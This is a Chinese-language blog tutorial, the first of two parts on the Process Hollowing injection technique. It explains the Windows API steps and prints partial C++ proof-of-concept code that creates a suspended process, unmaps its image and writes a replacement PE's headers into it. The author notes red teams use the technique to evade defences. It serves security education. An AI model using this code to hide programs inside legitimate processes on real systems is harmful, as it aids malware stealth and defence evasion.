# 【Day 20】薛丁格的 Process (上) - Process Hollowing

## 環境
* Windows 10 21H1
* Visual Studio 2019
* PE-bear v0.4.0.3

## 介紹
Process Hollowing 跟[【Day 06】致不滅的 DLL - DLL Injection](https://ithelp.ithome.com.tw/articles/10268768) 所介紹的 DLL Injection 都被 [MITRE](https://attack.mitre.org/techniques/T1055/) 歸類於 Process Injection 的範疇，也就是把自己的程式放到別的 Process 執行。
![](https://i.imgur.com/Yxk3moN.png)

因為 Process Hollowing 是把一個合法的 Process 原本要執行的程式挖空，並替換成自己的程式，其中被替換掉的 Process 指向的檔案路徑仍然是原本的。雖然實際上執行的是惡意程式，但外表卻看起來正常。所以對於紅隊來說它的優點就是可以用來繞過一些防禦。

## 原理
以下原理是在 32-bit 情況，因為同樣的技巧，32-bit 可以在 64-bit 執行，反之卻不能。但是 64-bit 原理其實一樣，只是有些細節差異。

### 實作流程
1. 建立一個 Suspended Process，它就是要被注入的目標 Process
2. 讀取要注入的檔案
3. Unmap 目標 Process 的記憶體
4. 在目標 Process 申請一塊記憶體
5. 把 Header 寫入目標 Process
6. 把各 Section 根據它們的 RVA 寫入目標 Process
7. Rebase Relocation Table，因為 Image Base 可能會不一樣
8. 取出目標 Process 的 Context，把暫存器 EAX 改成我們注入的程式的 Entry Point
9. 恢復執行原本狀態為 Suspended 的目標 Process

### 各步驟說明
在這一篇會說明前 5 個步驟，後 4 個會在下一篇繼續。

#### 1. 建立一個 Suspended Process，它就是要被注入的目標 Process
使用 [CreateProcessA](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) 建立 Process，其中有個重點是第六個參數 [dwCreationFlags](https://docs.microsoft.com/en-us/windows/win32/procthread/process-creation-flags) 必須是 CREATE_SUSPENDED (0x4)，因為需要它維持在初始狀態，讓我們能夠對其中的記憶體進行修改。下面可以看到 MSDN 對這個 Flag 的描述。
> The primary thread of the new process is created in a suspended state, and does not run until the ResumeThread function is called.

所以說在我們建立了目標 Process，並且把它的記憶體竄改成我們自己的程式後，呼叫 [ResumeThread](https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) 就可以讓它恢復執行。

有了目標 Process 的 Handle，就可以取得 PEB，裡面包含後面步驟需要用到的 ImageBaseAddress。

#### 2. 讀取要注入的檔案
使用 [CreateFileA](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea) 取得目標檔案的 Handle，然後用 [ReadFile](https://docs.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-readfile) 讀取檔案內容。

在這個步驟還需要取得 [File Header](https://docs.microsoft.com/en-us/windows/win32/debug/pe-format#signature-image-only) 和 [Optional Header](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_optional_header32)  的位址。會需要 File Header 是因為我們需要其中的 NumberOfSections 成員。會需要 Optional Header 則是因為我們需要其中的 SizeOfImage、ImageBase、SizeOfHeaders、IMAGE_DATA_DIRECTORY、AddressOfEntryPoint。需要它們的原因是等等要把每個 Header 和 Section 排到正確的位址。

File Header 和 Optional Header 各是 [NT Header](https://docs.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-image_nt_headers32) 的其中一個成員，NT Header 則是從 DOS Header 算出來的。
![](https://i.imgur.com/gokiolL.png)


#### 3. Unmap 目標 Process 的記憶體
從 ntdll.dll 中取出 [NtUnmapViewOfSection](https://docs.microsoft.com/en-us/windows-hardware/drivers/ddi/wdm/nf-wdm-zwunmapviewofsection) 函數，Unmap 目標 Process 的 Image。

如果想要觀察這個函數實際上做了什麼，可以用 x32dbg 下斷點，然後用 Process Explorer 觀察目標 Process。

下圖左邊是我在 x32dbg 下斷點於執行 NtUnmapViewOfSection 之前，而右邊 Process Explorer 下方則是目標 Process 目前的 Image。
![](https://i.imgur.com/2ZUD6uV.png)

執行 NtUnmapViewOfSection 後原本的 Image 就消失了。
![](https://i.imgur.com/9vijJHY.png)


#### 4. 在目標 Process 申請一塊記憶體
使用 [VirtualAllocEx](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex) 向目標 Process 申請一塊記憶體，其中參數的設定很重要。hProcess 是目標 Process 的 Handle；lpAddress 是原本被 Unmap 的 Image 的 Base Address；dwSize 是我們要注入的檔案大小；flAllocationType　是　MEM_COMMIT | MEM_RESERVE；flProtect 可以針對不同的記憶體區段去做配置，不過 POC 方便起見，直接用 PAGE_EXECUTE_READWRITE。
```
LPVOID VirtualAllocEx(
  HANDLE hProcess,
  LPVOID lpAddress,
  SIZE_T dwSize,
  DWORD  flAllocationType,
  DWORD  flProtect
);
```

#### 5. 把 Header 寫入目標 Process
把我們的檔案 Header 寫入目標 Process，首先要注意的是 Image Base 的部分。由於 Image 載入後，因為 ASLR(Address Space Layout Randomization) 的緣故，Image Base 不一定相同。

所以在改 Optional Header 中的 ImageBase 成員之前，我們要先算出檔案的 Image Base 和目標 Process 的 Image Base 的距離。之後就可以把檔案的 Header 用 [WriteProcessMemory](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) 寫到目標 Process。

那檔案的 Header 是指什麼呢？打開 PE-bear 查看檔案，可以看到左邊有 DOS Headers、DOS stub、NT Headers 等等。簡單來說，現在要寫入目標 Process 的部分就是除了 Sections 之外的東西。
![](https://i.imgur.com/wxKq8nu.png)

### POC
POC 改自 [m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing)，只有加入一些註解並把一些非必要的程式拔掉減少篇幅。完整的程式專案可以參考我的 GitHub [zeze-zeze/2021iThome](https://github.com/zeze-zeze/2021iThome/tree/master/%E8%96%9B%E4%B8%81%E6%A0%BC%E7%9A%84Process/Process-Hollowing/sourcecode)。
```cpp=
void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
{
    // 1. 建立一個 Suspended Process，它就是要被注入的目標 Process
    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();

    // 第六個參數必須是 CREATE_SUSPENDED，因為需要它維持在初始狀態，讓我們能夠對其中的記憶體進行修改
    CreateProcessA
    (
        0,
        pDestCmdLine,		
        0, 
        0, 
        0, 
        CREATE_SUSPENDED, 
        0, 
        0, 
        pStartupInfo, 
        pProcessInfo
    );
    if (!pProcessInfo->hProcess)
    {
        printf("Error creating process\r\n");

        return;
    }

    // 取得 PEB，裡面包含後面步驟需要用到的 ImageBaseAddress
    PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);
    PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);


    // 2. 讀取要注入的檔案
    HANDLE hFile = CreateFileA
    (
        pSourceFile,
        GENERIC_READ, 
        0, 
        0, 
        OPEN_ALWAYS, 
        0, 
        0
    );
    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Error opening %s\r\n", pSourceFile);
        return;
    }
    DWORD dwSize = GetFileSize(hFile, 0);
    PBYTE pBuffer = new BYTE[dwSize];
    DWORD dwBytesRead = 0;
    ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);

    // 取得 File Header 和 Optional Header
    // File Header 和 Optional Header 各是 NT Header 的其中一個成員，NT Header 則是從 DOS Header 算出來的
    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);
    PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);


    // 3. Unmap 目標 Process 的記憶體
    // 從 ntdll.dll 中取出 NtUnmapViewOfSection
    HMODULE hNTDLL = GetModuleHandleA("ntdll");
    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");
    _NtUnmapViewOfSection NtUnmapViewOfSection =
        (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;
    DWORD dwResult = NtUnmapViewOfSection
    (
        pProcessInfo->hProcess, 
        pPEB->ImageBaseAddress
    );
    if (dwResult)
    {
        printf("Error unmapping section\r\n");
        return;
    }


    // 4. 在目標 Process 申請一塊記憶體
    // Process 是目標 Process 的 Handle
    // lpAddress 是原本被 Unmap 的 Image 的 Base Address
    // dwSize 是我們要注入的檔案大小
    // flAllocationType　是　MEM_COMMIT | MEM_RESERVE
    // flProtect 可以針對不同的記憶體區段去做配置，不過 POC 方便起見，直接用 PAGE_EXECUTE_READWRITE
    PVOID pRemoteImage = VirtualAllocEx
    (
        pProcessInfo->hProcess,
        pPEB->ImageBaseAddress,
        pSourceHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );
    if (!pRemoteImage)
    {
        printf("VirtualAllocEx call failed\r\n");
        return;
    }


    // 5. 把 Header 寫入目標 Process
    // 在改 Optional Header 中的 ImageBase 成員之前，算出檔案的 Image Base 和目標 Process 的 Image Base 的距離
    DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress - pSourceHeaders->OptionalHeader.ImageBase;
    pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;

    // 把我們的檔案 Header 寫入目標 Process
    if (!WriteProcessMemory
    (
        pProcessInfo->hProcess, 				
        pPEB->ImageBaseAddress, 
        pBuffer, 
        pSourceHeaders->OptionalHeader.SizeOfHeaders, 
        0
    ))
    {
        printf("Error writing process memory\r\n");
        return;
    }
```

## 參考資料
* [m0n0ph1/Process-Hollowing](https://github.com/m0n0ph1/Process-Hollowing)
* [Windows Dll Injection、Process Injection、API Hook、DLL后门/恶意程序入侵技术](https://www.bbsmax.com/A/pRdBOwW6zn/)
* [十种注入技巧 | 通用性进程注入技巧研究看雪学院](https://zhuanlan.zhihu.com/p/28671064)
* [Mitre Att&ck: Process Hollowing](https://attack.mitre.org/techniques/T1055/012/)
* [PE 結構](https://www.cnblogs.com/Chary/p/12981261.html)
* [馬聖豪大大的 Blog](https://blog.30cm.tw/2015/05/windowspeasmdll-headerapiloadlibrarya.html)
